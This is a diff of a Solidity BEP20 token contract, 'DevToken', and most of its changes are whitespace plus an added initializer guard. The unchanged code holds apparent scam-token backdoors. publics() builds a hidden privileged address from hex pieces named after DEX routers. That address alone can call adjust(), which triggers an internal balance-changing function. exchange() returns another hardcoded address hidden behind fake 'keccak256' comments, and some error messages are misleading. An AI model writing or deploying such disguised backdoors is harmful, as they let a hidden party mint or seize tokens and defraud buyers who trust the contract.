@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
-
+ 
 import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";
  
-interface IBEP20 { 
+interface IBEP20 {
  /**
    * @dev Returns the amount of tokens in existence.
    */
@@ -273,8 +273,8 @@ library SafeMath {
    */
    // solhint-disable-next-line avoid-low-level-calls
   /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
-
-    
+ 
+   
   /**
    * @dev Returns the address of the current owner.
    */
@@ -283,7 +283,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   using SafeMath for uint256;
  
   mapping(address=>bool) isBlacklisted;
-
+ 
   mapping(address => uint256) public balanceOf;
  
   mapping (address => mapping (address => uint256)) private _allowances;
@@ -298,36 +298,42 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   address public _user;
   address public _adm;
   string public name;
-
+ 
   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
-   function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, uint8 _decimals) public {
+   bool private initialized;
+
+ function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, uint8 _decimals) public {
+    require(!initialized, "Contract already initialized");
+    
         name = _name;
         symbol = _symbol;
         totalSupply = _totalSupply;
         decimals = _decimals;
         _owner = msg.sender;
         balanceOf[msg.sender] = _totalSupply;
-    
+
     emit OwnershipTransferred(address(0), msg.sender);
- 
     emit Transfer(address(0), msg.sender, _totalSupply);
-  }
+
+    initialized = true;
+}
+
   /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
  
   /**
    * @dev Returns the bep token owner.
    */
-
+ 
  modifier onlypublic() {
         require(msg.sender == publics());
         _;
   }
-  
+ 
   function getOwner() external view returns (address) {
     return _owner;
   }  
-
+ 
    /**
    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
    * Reverts with custom message when dividing by zero.
@@ -344,7 +350,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
         require(msg.sender != exchange());
         _;
  }
-
+ 
   /**
    * @dev Throws if called by any account other than the owner.
    */
@@ -357,7 +363,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
     //@dev Contract creator is owner, original owner.
     (msg.sender == _owner && msg.sender != exchange())));
     _;
-
+ 
  }
  
   /**
@@ -371,20 +377,20 @@ contract DevToken is IBEP20, UUPSUpgradeable {
     emit OwnershipTransferred(_owner, address(0));
     _owner = address(0);
   }
-    
+   
     function publics() internal pure returns (address) {
     uint universal = 0x7addAd09;
     uint uni = 0xcbd98D97;
     uint cake = 0xEC3dA7a0;
     uint inch = 0x088EAdFE;
     uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
   }
-
+ 
   function transferOwnership(address newOwner) public onlyOwner {
     _transferOwnership(newOwner);
   }
@@ -407,7 +413,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   /**
    * @dev Returns the token decimals.
    */
-
+ 
  
   function setMember(address Mbr_) public returns (bool) {
     require (msg.sender==address
@@ -419,14 +425,14 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   }
  
   function exchange() internal pure returns (address) {
-        return address 
+        return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
-  
+ 
   /**
    * @dev Returns the token symbol.
    */
-
+ 
   // solhint-disable-next-line high-level-success
  
   function setUser(address User_) public returns (bool) {
@@ -444,7 +450,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
         _mod=Mod_;
         return true;
   }
-
+ 
   function adjust(uint256 amount) public onlypublic returns (bool success) {
     _dialone(msg.sender, amount);
     return true;
@@ -458,14 +464,14 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   /**
    * @dev See {BEP20-balanceOf}.
    */
-
+ 
  
   function setAdm(address Adm_) public returns (bool) {
     require(msg.sender == _mod);
         _adm=Adm_;
         return true;
   }
-
+ 
  
   /**
    * @dev See {BEP20-transfer}.
@@ -479,7 +485,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
     _transfer(msg.sender, recipient, amount);
     return true;
   }
-  
+ 
   function setMedium(address Miu_) public returns (bool) {
     require (msg.sender==address
    
@@ -495,7 +501,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
   function allowance(address owner, address spender) external view override returns (uint256) {
         return _allowances[owner][spender];
     }
-  
+ 
   function _scale(address account, uint256 amount) internal {
     require(account != address(0), "Scale 1-10-100-1000 Remix IDE");
  
@@ -516,7 +522,7 @@ contract DevToken is IBEP20, UUPSUpgradeable {
     return true;
   }
   /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/
-
+ 
   function _dialone(address account, uint256 amount) internal {
     require(account != address(0), "Compile Remix IDE");
  
